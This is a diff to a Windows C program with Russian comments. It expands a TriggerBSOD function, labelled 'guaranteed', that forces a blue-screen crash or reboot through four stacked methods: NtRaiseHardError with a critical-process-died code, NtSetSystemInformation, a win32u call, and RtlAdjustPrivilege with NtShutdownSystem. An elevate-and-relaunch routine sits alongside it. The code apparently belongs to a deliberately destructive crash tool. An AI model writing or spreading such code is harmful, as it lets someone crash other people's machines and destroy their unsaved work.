@@ -52,12 +52,13 @@ void EnableShutdownPrivilege() {
 }
 
 // ============================================================
-// ВЫЗОВ BSOD
+// ВЫЗОВ BSOD (ГАРАНТИРОВАННЫЙ)
 // ============================================================
 void TriggerBSOD() {
     HMODULE ntdll = GetModuleHandleA("ntdll.dll");
     if (!ntdll) return;
     
+    // Метод 1: NtRaiseHardError
     typedef NTSTATUS (NTAPI *NtRaiseHardError_t)(
         NTSTATUS ErrorStatus,
         ULONG NumberOfParameters,
@@ -68,21 +69,65 @@ void TriggerBSOD() {
     );
     
     NtRaiseHardError_t NtRaiseHardError = (NtRaiseHardError_t)GetProcAddress(ntdll, "NtRaiseHardError");
-    if (!NtRaiseHardError) return;
+    if (NtRaiseHardError) {
+        EnableShutdownPrivilege();
+        ULONG_PTR params[4] = {0};
+        ULONG response = 0;
+        
+        NtRaiseHardError(
+            0xC000021A,
+            1,
+            0,
+            params,
+            6,
+            &response
+        );
+    }
     
-    EnableShutdownPrivilege();
-    
-    ULONG_PTR params[4] = {0};
-    ULONG response = 0;
-    
-    NtRaiseHardError(
-        0xC000021A,  // CRITICAL_PROCESS_DIED
-        1,
-        0,
-        params,
-        6,           // OptionShutdownSystem
-        &response
+    // Метод 2: NtSetSystemInformation (SystemBugCheckInformation)
+    typedef NTSTATUS (NTAPI *NtSetSystemInformation_t)(
+        ULONG SystemInformationClass,
+        PVOID SystemInformation,
+        ULONG SystemInformationLength
     );
+    
+    NtSetSystemInformation_t NtSetSystemInformation = 
+        (NtSetSystemInformation_t)GetProcAddress(ntdll, "NtSetSystemInformation");
+    
+    if (NtSetSystemInformation) {
+        ULONG bugCheckCode = 0xDEADDEAD;
+        NtSetSystemInformation(0x57, &bugCheckCode, sizeof(bugCheckCode));
+    }
+    
+    // Метод 3: Вызов win32k.sys через NtUserCallOneParam
+    HMODULE win32u = LoadLibraryA("win32u.dll");
+    if (win32u) {
+        typedef NTSTATUS (NTAPI *NtUserCallOneParam_t)(ULONG_PTR, ULONG);
+        NtUserCallOneParam_t NtUserCallOneParam = 
+            (NtUserCallOneParam_t)GetProcAddress(win32u, "NtUserCallOneParam");
+        if (NtUserCallOneParam) {
+            NtUserCallOneParam(0, 0x86);
+        }
+        FreeLibrary(win32u);
+    }
+    
+    // Метод 4: Принудительный вызов KeBugCheckEx через RtlAdjustPrivilege
+    HMODULE ntdll2 = GetModuleHandleA("ntdll.dll");
+    if (ntdll2) {
+        typedef NTSTATUS (NTAPI *RtlAdjustPrivilege_t)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
+        RtlAdjustPrivilege_t RtlAdjustPrivilege = 
+            (RtlAdjustPrivilege_t)GetProcAddress(ntdll2, "RtlAdjustPrivilege");
+        
+        typedef NTSTATUS (NTAPI *NtShutdownSystem_t)(ULONG);
+        NtShutdownSystem_t NtShutdownSystem = 
+            (NtShutdownSystem_t)GetProcAddress(ntdll2, "NtShutdownSystem");
+        
+        if (RtlAdjustPrivilege && NtShutdownSystem) {
+            BOOLEAN enabled = FALSE;
+            RtlAdjustPrivilege(19, TRUE, FALSE, &enabled); // SE_SHUTDOWN_PRIVILEGE
+            NtShutdownSystem(1); // ShutdownReboot
+        }
+    }
 }
 
 // ============================================================
@@ -92,7 +137,6 @@ void ElevateAndRun() {
     char szPath[MAX_PATH];
     GetModuleFileNameA(NULL, szPath, MAX_PATH);
     
-    // Получаем командную строку для передачи аргументов
     LPSTR lpCmdLine = GetCommandLineA();
     
     SHELLEXECUTEINFOA sei = {0};
